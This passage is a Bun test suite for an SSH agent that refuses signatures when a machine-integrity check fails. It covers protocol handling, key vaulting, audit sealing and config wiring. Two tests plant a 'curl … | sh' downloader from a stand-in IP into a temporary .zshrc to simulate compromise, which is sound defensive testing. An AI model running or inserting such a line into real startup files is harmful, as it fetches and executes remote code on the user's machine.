// vswarm agent: the SSH agent protocol against the real ssh-add, ssh-keygen and ssh, and the policy at sign time.
// Every key is a throwaway made here, every socket and state folder is in a temp folder, and SSH_AUTH_SOCK is
// removed for the whole file: nothing talks to your own agent. The ssh-agents started here are killed by their PIDs.
import { afterAll, describe, expect, test } from "bun:test";
import { createCipheriv, createDecipheriv, randomBytes } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import {
  AGENT_MAX_AGE, agentCall, agentDoctor, agentJobFiles, agentSshBlock, agentUninstall, captureKey, gatedHosts, leftOnDisk, listIdentities, listVaults, MSG, protect, restore, setAgentBlock, setKeyPolicy, startAgent,
  unprotect, UPSTREAM_SIGN_TIMEOUT, type AgentOptions,
} from "../src/sec/agent";
import type { Ctx } from "../src/sec/ctx";
import { fileStore, type KeyStore } from "../src/sec/seal";
import { forBaseline, scan } from "../src/sec/scan";
import { fingerprint, parsePublicLine, signedFor, Writer } from "../src/sec/sshkey";
import { clearLock, files, readAudit, saveBaseline, saveLast, setLock, useKeyStore } from "../src/sec/store";
import type { Scan, Verdict } from "../src/sec/types";
import { sshGate } from "../src/setup";

const WIN = process.platform === "win32";
const savedSock = process.env.SSH_AUTH_SOCK;
delete process.env.SSH_AUTH_SOCK;
afterAll(() => {
  if (savedSock !== undefined) process.env.SSH_AUTH_SOCK = savedSock;
});

const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-sshagent-${tag}-`));
const ctxFor = (home: string): Ctx => ({ home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined });
/** Environment for ssh tools: this one's agent only. */
const envWith = (sock?: string, more: Record<string, string> = {}) => {
  const e: Record<string, string | undefined> = { ...process.env, ...more };
  delete e.SSH_AUTH_SOCK;
  if (sock) e.SSH_AUTH_SOCK = sock;
  return e;
};

async function sh(cmd: string[], env = envWith(), stdin?: string) {
  const p = Bun.spawn(cmd, { env, stdin: stdin === undefined ? "ignore" : new Blob([stdin]), stdout: "pipe", stderr: "pipe" });
  const [out, err, code] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text(), p.exited]);
  return { code, out, err };
}

/** A throwaway key pair; `pass` is a literal used only by these tests. */
async function keygen(dir: string, name: string, type: string[] = ["-t", "ed25519"], pass = "") {
  const f = join(dir, name);
  expect((await sh(["ssh-keygen", "-q", ...type, "-N", pass, "-C", `test-${name}`, "-f", f])).code).toBe(0);
  return f;
}

/** Runs fn with vswarm's state and the agent's folder in fresh temp folders, the sealing key in a file there. */
async function withState<T>(fn: (dirs: { sec: string; agent: string; home: string }) => Promise<T>): Promise<T> {
  const prev = { sec: process.env.VSWARM_SEC_DIR, agent: process.env.VSWARM_AGENT_DIR };
  const root = tmp("st");
  const dirs = { sec: join(root, "sec"), agent: join(root, "a"), home: join(root, "home") };
  mkdirSync(dirs.home);
  process.env.VSWARM_SEC_DIR = dirs.sec;
  process.env.VSWARM_AGENT_DIR = dirs.agent;
  useKeyStore(undefined);
  try {
    return await fn(dirs);
  } finally {
    useKeyStore(undefined);
    for (const [k, v] of [["VSWARM_SEC_DIR", prev.sec], ["VSWARM_AGENT_DIR", prev.agent]] as const) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    rmSync(root, { recursive: true, force: true });
  }
}

const sealed = (verdict: Verdict) => saveLast({ verdict, findings: [], at: Date.now(), scan: {} as Scan });

/** An agent on a socket in the temp agent folder; notifications are collected and confirmations refused, never shown. */
async function agentFor(dirs: { agent: string; home: string }, more: Partial<AgentOptions> = {}) {
  const told: string[] = [];
  const a = await startAgent({ sock: join(dirs.agent, "agent.sock"), ctx: ctxFor(dirs.home), offline: true, notify: async (t, b) => void told.push(`${t}: ${b}`), confirm: async () => false, log: () => {}, ...more });
  return { a, told };
}

/** ssh-keygen -Y sign through the agent, then -Y verify; returns whether a good signature came out. */
async function signVerify(sock: string, pubFile: string, dir: string): Promise<boolean> {
  // Only the public half beside it: ssh-keygen falls back to a private key file next to the .pub, and must not here.
  const only = mkdtempSync(join(dir, "pub-"));
  const pub = join(only, "key.pub");
  writeFileSync(pub, readFileSync(pubFile));
  const msg = join(dir, `msg-${Math.random().toString(36).slice(2)}`);
  writeFileSync(msg, "deploy to production\n");
  const s = await sh(["ssh-keygen", "-Y", "sign", "-f", pub, "-n", "file", msg], envWith(sock));
  if (s.code !== 0) return false;
  writeFileSync(join(dir, "allowed"), `tester ${readFileSync(pub, "utf8")}`);
  const v = await sh(["ssh-keygen", "-Y", "verify", "-f", join(dir, "allowed"), "-I", "tester", "-n", "file", "-s", `${msg}.sig`], envWith(), "deploy to production\n");
  return v.code === 0 && v.out.includes("Good");
}

describe.skipIf(WIN)("vswarm agent: the protocol", () => {
  test("keys, fingerprints and public lines come out as ssh-keygen writes them", () => withState(async (d) => {
    for (const t of [["-t", "ed25519"], ["-t", "rsa", "-b", "2048"], ["-t", "ecdsa", "-b", "256"], ["-t", "ecdsa", "-b", "384"], ["-t", "ecdsa", "-b", "521"]]) {
      const f = await keygen(d.home, `k${t.join("")}`, t);
      const k = await captureKey(f, envWith(undefined, { SSH_ASKPASS_REQUIRE: "never" }));
      expect(k.blob.equals(parsePublicLine(readFileSync(`${f}.pub`, "utf8"))!)).toBe(true);
      expect((await sh(["ssh-keygen", "-l", "-f", `${f}.pub`])).out).toContain(fingerprint(k.blob));
    }
  }), 60_000);

  test("what a signature is for: an ssh login (with the server's host key), an SSHSIG, anything else", () => {
    const hostKey = new Writer().str("ssh-ed25519").str(Buffer.alloc(32, 7)).out();
    const data = new Writer().str(Buffer.alloc(32, 1)).u8(50).str("deploy").str("ssh-connection").str("publickey-hostbound-v00@openssh.com").u8(1).str("ssh-ed25519").str(Buffer.alloc(51)).str(hostKey).out();
    expect(signedFor(data)).toEqual({ kind: "userauth", user: "deploy", alg: "ssh-ed25519", hostKey: fingerprint(hostKey) });
    const sig = Buffer.concat([Buffer.from("SSHSIG"), new Writer().str("git").str("").str("sha512").str(Buffer.alloc(64)).out()]);
    expect(signedFor(sig)).toEqual({ kind: "sshsig", namespace: "git" });
    expect(signedFor(Buffer.from("anything")).kind).toBe("other");
  });

  test("round trips: list, add (also constrained), remove, remove all, lock and unlock, extensions and nonsense fail", () => withState(async (d) => {
    await sealed("pass");
    const { a } = await agentFor(d, { vaults: false });
    try {
      const k1 = await keygen(d.home, "one"), k2 = await keygen(d.home, "two", ["-t", "rsa", "-b", "2048"]);
      expect(await listIdentities(a.sock)).toEqual([]);
      expect((await sh(["ssh-add", k1], envWith(a.sock))).code).toBe(0);
      expect((await sh(["ssh-add", "-c", k2], envWith(a.sock))).code).toBe(0);
      const ids = await listIdentities(a.sock);
      expect(ids?.map((i) => i.comment)).toEqual(["test-one", "test-two"]);
      expect(a.held().find((h) => h.comment === "test-two")?.confirm).toBe(true);
      expect((await sh(["ssh-add", "-l"], envWith(a.sock))).out).toContain("test-one");
      // REMOVE_IDENTITY by blob, through ssh-add -d.
      expect((await sh(["ssh-add", "-d", `${k1}.pub`], envWith(a.sock))).code).toBe(0);
      expect((await listIdentities(a.sock))?.map((i) => i.comment)).toEqual(["test-two"]);
      expect((await agentCall(a.sock, new Writer().u8(MSG.REMOVE_IDENTITY).str(ids![0].blob).out()))?.[0]).toBe(MSG.FAILURE);
      // A lifetime: gone when it runs out.
      expect((await sh(["ssh-add", "-t", "1", k1], envWith(a.sock))).code).toBe(0);
      expect((await listIdentities(a.sock))?.length).toBe(2);
      await Bun.sleep(1300);
      expect((await listIdentities(a.sock))?.length).toBe(1);
      // LOCK hides every key and refuses to sign; a wrong passphrase does not unlock.
      const lockMsg = (t: number, p: string) => new Writer().u8(t).str(p).out();
      expect((await agentCall(a.sock, lockMsg(MSG.LOCK, "throwaway-lock")))?.[0]).toBe(MSG.SUCCESS);
      expect(await listIdentities(a.sock)).toEqual([]);
      expect(await signVerify(a.sock, `${k2}.pub`, d.home)).toBe(false);
      expect((await agentCall(a.sock, lockMsg(MSG.UNLOCK, "wrong")))?.[0]).toBe(MSG.FAILURE);
      expect((await agentCall(a.sock, lockMsg(MSG.UNLOCK, "throwaway-lock")))?.[0]).toBe(MSG.SUCCESS);
      expect((await listIdentities(a.sock))?.length).toBe(1);
      // REMOVE_ALL, through ssh-add -D.
      expect((await sh(["ssh-add", "-D"], envWith(a.sock))).code).toBe(0);
      expect(await listIdentities(a.sock)).toEqual([]);
      // Extensions, unknown messages and malformed ones: SSH_AGENT_FAILURE, and the connection stays usable.
      expect((await agentCall(a.sock, new Writer().u8(MSG.EXTENSION).str("query").out()))?.[0]).toBe(MSG.FAILURE);
      expect((await agentCall(a.sock, Buffer.from([99])))?.[0]).toBe(MSG.FAILURE);
      expect((await agentCall(a.sock, Buffer.from([MSG.SIGN_REQUEST, 0, 0, 9])))?.[0]).toBe(MSG.FAILURE);
      expect((await agentCall(a.sock, new Writer().u8(MSG.ADD_IDENTITY).str("ssh-dss").out()))?.[0]).toBe(MSG.FAILURE);
      // An ed25519 key whose public half is not its private half's is refused.
      const bad = new Writer().u8(MSG.ADD_IDENTITY).str("ssh-ed25519").str(Buffer.alloc(32, 1)).str(Buffer.alloc(64, 2)).str("x").out();
      expect((await agentCall(a.sock, bad))?.[0]).toBe(MSG.FAILURE);
      // A length past OpenSSH's 256 KiB limit ends the connection instead of buffering it.
      const conn = await Bun.connect({ unix: a.sock, socket: { data() {}, close() {} } });
      conn.write(new Writer().u32(10_000_000).out());
      await Bun.sleep(200);
      expect(conn.readyState).not.toBe(1);
      // The socket is the owner's only, in a folder only the owner can enter.
      expect(statSync(d.agent).mode & 0o077).toBe(0);
      expect(statSync(a.sock).mode & 0o077).toBe(0);
    } finally {
      a.stop();
    }
  }), 60_000);

  test("refuses a folder others can enter", () => withState(async (d) => {
    mkdirSync(d.agent, { mode: 0o755 });
    chmodSync(d.agent, 0o755);
    await expect(agentFor(d)).rejects.toThrow("other users");
  }));
});

describe.skipIf(WIN)("vswarm agent: signing only when the machine passes", () => {
  test("ssh-keygen -Y sign through the agent verifies with ssh-keygen -Y verify (ed25519, rsa-sha2-512, ecdsa)", () => withState(async (d) => {
    await sealed("pass");
    const { a } = await agentFor(d, { vaults: false });
    try {
      for (const [name, t] of [["ed", ["-t", "ed25519"]], ["rsa", ["-t", "rsa", "-b", "3072"]], ["ec", ["-t", "ecdsa", "-b", "256"]], ["ec5", ["-t", "ecdsa", "-b", "521"]]] as const) {
        const k = await keygen(d.home, name, [...t]);
        expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
        expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      }
    } finally {
      a.stop();
    }
    const audit = await readAudit();
    expect(audit.why).toBeUndefined();
    expect(audit.entries.map((e) => e.event)).toEqual(["sign", "sign", "sign", "sign"]);
    expect(audit.entries[0].reason).toContain("PASS · ssh-keygen -Y sign, namespace file");
  }), 60_000);

  test("a sealed BLOCK, or an open incident, refuses: SSH_AGENT_FAILURE, a notification, a sealed audit line", () => withState(async (d) => {
    const { a, told } = await agentFor(d, { vaults: false });
    try {
      const k = await keygen(d.home, "prod");
      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
      const fp = fingerprint(parsePublicLine(readFileSync(`${k}.pub`, "utf8"))!);
      await sealed("block");
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      expect(told.at(-1)).toContain("does not pass preflight");
      expect(told.at(-1)).toContain("vswarm preflight --fresh");
      // A passing verdict with an incident open: still refused, and the notice says why.
      await sealed("pass");
      await setLock({ incident: "t-1", at: Date.now(), reason: "test" });
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      expect(told.at(-1)).toContain("incident t-1 is open");
      await clearLock("t-1");
      await sealed("pass");
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      const audit = await readAudit();
      expect(audit.why).toBeUndefined();
      expect(audit.entries.map((e) => e.event)).toEqual(["refuse", "refuse", "sign"]);
      expect(audit.entries.every((e) => e.incident === fp)).toBe(true);
      // The audit log is chained and sealed like the incident log: one changed character is noticed.
      writeFileSync(files.audit(), readFileSync(files.audit(), "utf8").replace("PASS", "PASs"));
      expect((await readAudit()).why).toContain("changed outside vswarm");
    } finally {
      a.stop();
    }
  }), 60_000);

  test("a last.json forged to say pass does not make it sign: the agent checks the machine again", () => withState(async (d) => {
    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n");
    const ctx = ctxFor(d.home);
    await saveBaseline(forBaseline(await scan(ctx, { live: false })));
    // Planted after the baseline: a downloader in a startup file.
    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
    const { a } = await agentFor(d, { vaults: false });
    try {
      const k = await keygen(d.home, "prod");
      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
      writeFileSync(files.last(), JSON.stringify({ verdict: "pass", findings: [], at: Date.now(), scan: {} }));
      rmSync(`${files.last()}.seal`, { force: true });
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      expect((await readAudit()).entries.at(-1)?.event).toBe("refuse");
    } finally {
      a.stop();
    }
  }), 60_000);

  test("WARN signs unless the key is strict; a confirm-on-use key asks every time", () => withState(async (d) => {
    let verdict: Verdict = "warn";
    let answer = false;
    const asked: string[] = [];
    const { a } = await agentFor(d, { vaults: false, verdict: async () => verdict, confirm: async (q) => (asked.push(q), answer) });
    try {
      const k = await keygen(d.home, "w");
      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      expect((await readAudit()).entries.at(-1)?.reason).toContain("WARN");
      expect((await sh(["ssh-add", "-c", k], envWith(a.sock))).code).toBe(0);
      verdict = "pass";
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      answer = true;
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      expect(asked.length).toBe(2);
      expect(asked[0]).toContain("test-w");
    } finally {
      a.stop();
    }
  }), 60_000);

  test("keys it does not hold go to the upstream agent untouched, whatever the verdict", () => withState(async (d) => {
    const upSock = join(d.home, "up.sock");
    // A throwaway ssh-agent of our own, in the foreground so its PID is the one we kill.
    const up = Bun.spawn(["ssh-agent", "-D", "-a", upSock], { env: envWith(), stdout: "ignore", stderr: "ignore" });
    try {
      for (let i = 0; i < 50 && !existsSync(upSock); i++) await Bun.sleep(100);
      const git = await keygen(d.home, "git");
      expect((await sh(["ssh-add", git], envWith(upSock))).code).toBe(0);
      await sealed("block");
      const { a } = await agentFor(d, { vaults: false, upstream: upSock });
      try {
        const prod = await keygen(d.home, "prod");
        expect((await sh(["ssh-add", prod], envWith(a.sock))).code).toBe(0);
        expect((await listIdentities(a.sock))?.map((i) => i.comment)).toEqual(["test-prod", "test-git"]);
        // The machine is blocked: the production key refuses, the everyday key still signs.
        expect(await signVerify(a.sock, `${git}.pub`, d.home)).toBe(true);
        expect(await signVerify(a.sock, `${prod}.pub`, d.home)).toBe(false);
        // Only keys vswarm holds are logged.
        expect((await readAudit()).entries.map((e) => e.event)).toEqual(["refuse"]);
        // The upstream agent never received the production key.
        expect((await listIdentities(upSock))?.map((i) => i.comment)).toEqual(["test-git"]);
      } finally {
        a.stop();
      }
    } finally {
      process.kill(up.pid);
      await up.exited;
    }
  }), 60_000);
});

describe.skipIf(WIN)("vswarm agent: the policy at its edges", () => {
  test("a key store that does not answer: no signature, the refusal says why, and nothing unsealed lands in the audit log", () => withState(async (d) => {
    const { a, told } = await agentFor(d, { vaults: false, verdict: async () => "pass" });
    try {
      const k = await keygen(d.home, "prod");
      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
      // The Keychain stops answering (locked, or not up yet when launchd started the agent).
      const inner = fileStore(join(d.sec, "keys"));
      const store: KeyStore = { kind: "file", where: "a locked test store", get: async () => { throw new Error("User interaction is not allowed"); }, set: inner.set, remove: inner.remove };
      useKeyStore(store);
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      expect(told.at(-1)).toContain("could not be sealed");
      expect(existsSync(files.audit())).toBe(false);
      // It answers again: signing works, and the log verifies (the review's probe left it "changed outside vswarm").
      useKeyStore(undefined);
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      const audit = await readAudit();
      expect([audit.why, audit.entries.map((e) => e.event)]).toEqual([undefined, ["sign"]]);
    } finally {
      a.stop();
    }
  }), 60_000);

  test("ssh-add -d and -D reach your usual agent for the keys vswarm does not hold; protected keys stay", () => withState(async (d) => {
    const upSock = join(d.home, "up.sock");
    const up = Bun.spawn(["ssh-agent", "-D", "-a", upSock], { env: envWith(), stdout: "ignore", stderr: "ignore" });
    try {
      for (let i = 0; i < 50 && !existsSync(upSock); i++) await Bun.sleep(100);
      const git = await keygen(d.home, "git"), other = await keygen(d.home, "other");
      for (const f of [git, other]) expect((await sh(["ssh-add", f], envWith(upSock))).code).toBe(0);
      const { a } = await agentFor(d, { vaults: false, upstream: upSock });
      try {
        const mine = await keygen(d.home, "mine");
        expect((await sh(["ssh-add", mine], envWith(a.sock))).code).toBe(0);
        // Before, these failed: vswarm answered for keys it never held.
        expect((await sh(["ssh-add", "-d", `${git}.pub`], envWith(a.sock))).code).toBe(0);
        expect((await listIdentities(upSock))?.map((i) => i.comment)).toEqual(["test-other"]);
        expect((await sh(["ssh-add", "-D"], envWith(a.sock))).code).toBe(0);
        expect(await listIdentities(upSock)).toEqual([]);
        expect(await listIdentities(a.sock)).toEqual([]);
        // A key in neither agent: the upstream says no, and so does ssh-add.
        expect((await sh(["ssh-add", "-d", `${git}.pub`], envWith(a.sock))).code).not.toBe(0);
      } finally {
        a.stop();
      }
    } finally {
      process.kill(up.pid);
      await up.exited;
    }
  }), 60_000);

  test("a protected key signs on a verdict at most 30 seconds old; older, the machine is checked again", () => withState(async (d) => {
    expect(AGENT_MAX_AGE).toBeLessThanOrEqual(30_000);
    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n");
    const ctx = ctxFor(d.home);
    await saveBaseline(forBaseline(await scan(ctx, { live: false })));
    // The baseline from before both verdicts below, so neither is set aside as older than a decision.
    const old = new Date(Date.now() - 300_000);
    utimesSync(files.baseline(), old, old);
    // Planted since: a downloader in a startup file. A fresh check blocks.
    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
    const { a } = await agentFor(d, { vaults: false });
    try {
      const k = await keygen(d.home, "prod");
      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
      // A sealed PASS from 10 seconds ago is used as it is: ssh stays quick.
      await saveLast({ verdict: "pass", findings: [], at: Date.now() - 10_000, scan: {} as Scan });
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      // One from a minute ago (preflight would still reuse it, up to two minutes) is not: checked again, and it blocks.
      await saveLast({ verdict: "pass", findings: [], at: Date.now() - 60_000, scan: {} as Scan });
      utimesSync(files.baseline(), old, old);
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
      expect((await readAudit()).entries.map((e) => e.event)).toEqual(["sign", "refuse"]);
    } finally {
      a.stop();
    }
  }), 60_000);

  test("protected keys are strict by default: WARN refuses unless protected with --allow-warn; keys from 2.6 are strict too, and agent policy changes it", () => withState(async (d) => {
    let verdict: Verdict = "warn";
    const k1 = await keygen(d.home, "strict_key"), k2 = await keygen(d.home, "lenient_key"), k3 = await keygen(d.home, "old_key");
    const r1 = await protect(k1, { env: envWith() });
    await protect(k2, { env: envWith(), allowWarn: true });
    const r3 = await protect(k3, { env: envWith() });
    // A vault as 2.6 wrote it for a key protected without --strict: { strict: false }, no allowWarn.
    const wk = Buffer.from(readFileSync(join(d.sec, "keys", "agent-key"), "utf8").trim(), "hex");
    const v3 = JSON.parse(readFileSync(r3.vault, "utf8"));
    const aad = Buffer.from(`vswarm-agent-vault-v1\0${v3.fp}\0${v3.path}`);
    const box = Buffer.from(v3.box, "base64");
    const de = createDecipheriv("aes-256-gcm", wk, box.subarray(0, 12)).setAAD(aad);
    de.setAuthTag(box.subarray(12, 28));
    const { allowWarn: _a, ...inside } = JSON.parse(Buffer.concat([de.update(box.subarray(28)), de.final()]).toString("utf8"));
    const iv = randomBytes(12);
    const ci = createCipheriv("aes-256-gcm", wk, iv).setAAD(aad);
    const ct = Buffer.concat([ci.update(JSON.stringify({ ...inside, strict: false })), ci.final()]);
    writeFileSync(r3.vault, JSON.stringify({ ...v3, box: Buffer.concat([iv, ci.getAuthTag(), ct]).toString("base64") }));
    const { a } = await agentFor(d, { verdict: async () => verdict });
    try {
      const held = Object.fromEntries(a.held().map((h) => [h.comment, h.strict]));
      expect(held).toEqual({ "test-strict_key": true, "test-lenient_key": false, "test-old_key": true });
      expect(await signVerify(a.sock, `${k1}.pub`, d.home)).toBe(false);
      expect(await signVerify(a.sock, `${k2}.pub`, d.home)).toBe(true);
      expect(await signVerify(a.sock, `${k3}.pub`, d.home)).toBe(false);
      // The migration for a key that should keep signing on WARN: agent policy --allow-warn, picked up by the running agent.
      await setKeyPolicy(k3, true);
      expect(await signVerify(a.sock, `${k3}.pub`, d.home)).toBe(true);
      await setKeyPolicy(r1.fp, false);
      verdict = "pass";
      expect(await signVerify(a.sock, `${k1}.pub`, d.home)).toBe(true);
    } finally {
      a.stop();
    }
  }), 60_000);

  test("signatures for upstream keys wait for the upstream agent (confirm-on-use, a hardware touch) up to a minute, not ten seconds", () => withState(async (d) => {
    expect(UPSTREAM_SIGN_TIMEOUT).toBe(60_000);
    // A stand-in for an upstream agent that asks you first: it answers a signature after 400 ms.
    const upSock = join(d.home, "slow.sock");
    const srv = Bun.listen<undefined>({
      unix: upSock,
      socket: {
        data(s, chunk) {
          if (Buffer.from(chunk)[4] !== MSG.SIGN_REQUEST) return void s.write(new Writer().u32(1).u8(MSG.FAILURE).out());
          const reply = new Writer().u8(MSG.SIGN_RESPONSE).str("sig").out();
          setTimeout(() => s.write(Buffer.concat([new Writer().u32(reply.length).out(), reply])), 400);
        },
      },
    });
    const req = new Writer().u8(MSG.SIGN_REQUEST).str(Buffer.from("not a key vswarm holds")).str("data").u32(0).out();
    try {
      let r = await agentFor(d, { vaults: false, upstream: upSock, upstreamSignTimeout: 100 });
      expect((await agentCall(r.a.sock, req))?.[0]).toBe(MSG.FAILURE);
      r.a.stop();
      r = await agentFor(d, { vaults: false, upstream: upSock, upstreamSignTimeout: 2000 });
      expect((await agentCall(r.a.sock, req))?.[0]).toBe(MSG.SIGN_RESPONSE);
      r.a.stop();
    } finally {
      srv.stop(true);
    }
  }), 60_000);

  test("protect cut short after the vault was written: the recovery code still comes back, status and doctor say so, protect again finishes", () => withState(async (d) => {
    const k = await keygen(d.home, "prod_key");
    const r = await protect(k, { env: envWith(), shred: () => { throw new Error("EPERM: operation not permitted, unlink"); } });
    expect(r.left).toContain("EPERM");
    expect(r.code).toMatch(/^[A-Z2-9]{5}(-[A-Z2-9]{5}){5}$/);
    expect(existsSync(k) && existsSync(r.vault) && existsSync(r.backup)).toBe(true);
    expect(leftOnDisk()).toEqual([{ path: k, fp: r.fp }]);
    expect((await agentDoctor()).map((x) => x.text)).toContain(`a file is still at ${k.replace(homedir(), "~")}, though that key is in the vault`);
    // Before, this said "already protected" and left the key on disk for good.
    const again = await protect(k, { env: envWith() });
    expect([again.finished, again.code, again.fp]).toEqual([true, "", r.fp]);
    expect(existsSync(k)).toBe(false);
    expect(leftOnDisk()).toEqual([]);
    await expect(protect(k, { env: envWith() })).rejects.toThrow("already protected");
    // A different file at that path now is not touched.
    const k2 = await keygen(d.home, "second_key");
    await protect(k2, { env: envWith(), shred: () => { throw new Error("EBUSY"); } });
    writeFileSync(k2, "something else\n");
    await expect(protect(k2, { env: envWith() })).rejects.toThrow("not that key");
    expect(readFileSync(k2, "utf8")).toBe("something else\n");
  }), 60_000);
});

describe.skipIf(WIN)("vswarm agent: protected keys", () => {
  test("protect moves a key into the vault and off the disk; unprotect puts it back byte for byte", () => withState(async (d) => {
    // A passphrase-protected key, the passphrase typed by a stand-in for ssh's own prompt (a throwaway literal).
    const k = await keygen(d.home, "prod_key", ["-t", "ed25519"], "throwaway-test-passphrase");
    const askpass = join(d.home, "askpass.sh");
    writeFileSync(askpass, "#!/bin/sh\necho throwaway-test-passphrase\n", { mode: 0o700 });
    const env = envWith(undefined, { SSH_ASKPASS: askpass, SSH_ASKPASS_REQUIRE: "force", DISPLAY: ":0" });
    const original = readFileSync(k);
    const pub = readFileSync(`${k}.pub`, "utf8");
    const r = await protect(k, { env });
    expect(existsSync(k)).toBe(false);
    expect(readFileSync(`${k}.pub`, "utf8")).toBe(pub);
    expect(existsSync(r.vault) && existsSync(r.backup)).toBe(true);
    expect(r.code).toMatch(/^[A-Z2-9]{5}(-[A-Z2-9]{5}){5}$/);
    // Neither the vault nor the backup is a key file anything else can read.
    expect(readFileSync(r.vault, "utf8")).not.toContain("PRIVATE KEY");
    expect((await sh(["ssh-keygen", "-y", "-f", k], env)).code).not.toBe(0);
    expect((await sh(["ssh-keygen", "-y", "-f", r.backup], env)).code).not.toBe(0);
    await expect(protect(`${k}.pub`, { env })).rejects.toThrow("public key");
    // The agent holds it from the vault, and signs with it while the machine passes.
    await sealed("pass");
    const { a } = await agentFor(d);
    try {
      expect(a.held()).toEqual([{ fp: r.fp, comment: "test-prod_key", vault: true, confirm: false, strict: true }]);
      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
      // ssh-add -D does not take a protected key away; only unprotect does.
      expect((await sh(["ssh-add", "-D"], envWith(a.sock))).code).toBe(0);
      expect(a.held().length).toBe(1);
      expect(listVaults().length).toBe(1);
      await expect(agentUninstall(true)).rejects.toThrow("unprotect");
      const u = await unprotect(k);
      expect(u.fp).toBe(r.fp);
      expect(readFileSync(k).equals(original)).toBe(true);
      expect(existsSync(r.vault) || existsSync(r.backup)).toBe(false);
      // The agent notices the vault is gone.
      expect(await listIdentities(a.sock)).toEqual([]);
    } finally {
      a.stop();
    }
    // The restored file is the user's own again, passphrase and all.
    expect((await sh(["ssh-keygen", "-y", "-f", k], env)).out).toContain(pub.split(" ")[1]);
  }), 60_000);

  test("the backup opens with the recovery code alone, after the vault and its key are gone", () => withState(async (d) => {
    const k = await keygen(d.home, "prod_key");
    const original = readFileSync(k);
    const r = await protect(k, { env: envWith() });
    rmSync(r.vault);
    rmSync(join(d.sec, "keys"), { recursive: true, force: true });
    expect(() => restore(r.backup, "AAAAA-AAAAA-AAAAA-AAAAA-AAAAA-AAAAA")).toThrow("does not open");
    const out = restore(r.backup, r.code.toLowerCase().replace(/-/g, " "));
    expect(out.path).toBe(k);
    expect(readFileSync(k).equals(original)).toBe(true);
    expect(() => restore(r.backup, r.code)).toThrow("exists");
  }), 60_000);

  test("a vault moved to another key path, or edited, does not open", () => withState(async (d) => {
    const k = await keygen(d.home, "prod_key");
    const r = await protect(k, { env: envWith() });
    const v = JSON.parse(readFileSync(r.vault, "utf8"));
    writeFileSync(r.vault, JSON.stringify({ ...v, path: join(d.home, "elsewhere") }));
    await expect(unprotect(join(d.home, "elsewhere"))).rejects.toThrow();
    await expect(unprotect(r.fp)).rejects.toThrow();
    writeFileSync(r.vault, JSON.stringify({ ...v, box: v.box.slice(0, -4) + (v.box.endsWith("AAAA") ? "BBBB" : "AAAA") }));
    await expect(unprotect(r.fp)).rejects.toThrow();
    expect(existsSync(k)).toBe(false);
    writeFileSync(r.vault, JSON.stringify(v));
    expect((await unprotect(k)).fp).toBe(r.fp);
  }), 60_000);
});

describe.skipIf(WIN)("vswarm agent: how it is wired in", () => {
  test("IdentityAgent for the gated hosts goes first in ~/.ssh/config and leaves cleanly", () => {
    const dir = tmp("cfg");
    const cfg = join(dir, "config");
    const theirs = 'Host *\n    IdentityAgent "~/other/agent.sock"\n';
    writeFileSync(cfg, theirs);
    const hosts = gatedHosts(sshGate(["prod-*", "*.internal"], ["/v/vswarm"], { win: false }));
    expect(hosts).toEqual(["prod-*", "*.internal"]);
    const block = agentSshBlock(hosts, "/Users/a/.vswarm/agent/agent.sock");
    expect(block).toContain('Match originalhost prod-*,*.internal\n    IdentityAgent "/Users/a/.vswarm/agent/agent.sock"');
    expect(setAgentBlock(cfg, block).changed).toBe(true);
    expect(readFileSync(cfg, "utf8").startsWith("# >>> vswarm agent >>>")).toBe(true);
    expect(setAgentBlock(cfg, block).changed).toBe(false);
    setAgentBlock(cfg, null);
    expect(readFileSync(cfg, "utf8")).toBe(theirs);
    expect(() => agentSshBlock(["prod-* !exec x"], "/s")).toThrow("pattern");
    expect(() => agentSshBlock(["prod"], '/a"b')).toThrow("double quote");
    rmSync(dir, { recursive: true, force: true });
  });

  test("the LaunchAgent and the systemd user service run `vswarm agent run` and restart it", () => {
    const home = "/home/t";
    const mac = Object.entries(agentJobFiles("/home/t/.vswarm/bin/vswarm", home, "darwin"))[0];
    expect(mac[0]).toBe("/home/t/Library/LaunchAgents/dev.vswarm.agent.plist");
    expect(mac[1]).toContain("<string>/home/t/.vswarm/bin/vswarm</string><string>agent</string><string>run</string>");
    expect(mac[1]).toContain("<key>KeepAlive</key><true/>");
    const linux = Object.entries(agentJobFiles("/home/t/.vswarm/bin/vswarm", home, "linux"))[0];
    expect(linux[0]).toBe("/home/t/.config/systemd/user/vswarm-agent.service");
    expect(linux[1]).toContain("ExecStart=/home/t/.vswarm/bin/vswarm agent run\nRestart=on-failure");
  });
});

describe.skipIf(WIN || !existsSync("/usr/sbin/sshd"))("vswarm agent: a real ssh login", () => {
